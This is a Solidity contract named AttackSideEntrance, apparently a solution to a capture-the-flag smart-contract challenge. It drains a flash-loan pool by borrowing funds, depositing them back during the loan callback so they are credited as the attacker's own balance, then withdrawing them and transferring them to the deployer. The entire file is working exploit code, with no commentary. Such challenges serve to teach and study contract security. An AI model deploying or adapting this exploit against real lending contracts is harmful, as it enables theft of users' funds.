pragma solidity ^0.6.0;
import "../side-entrance/SideEntranceLenderPool.sol";

contract AttackSideEntrance {
    address payable attacker;

    SideEntranceLenderPool public pool;

    constructor(address _pool) public {
        pool = SideEntranceLenderPool(_pool);
        attacker = msg.sender;
    }

    function loan(uint256 _amount) external {
        pool.flashLoan(_amount);
    }

    function execute() external payable {
        uint256 balance = address(this).balance;
        pool.deposit{value: balance}();
    }

    function steal() external {
        pool.withdraw();
        attacker.transfer(address(this).balance);
    }

    receive() external payable {}
}
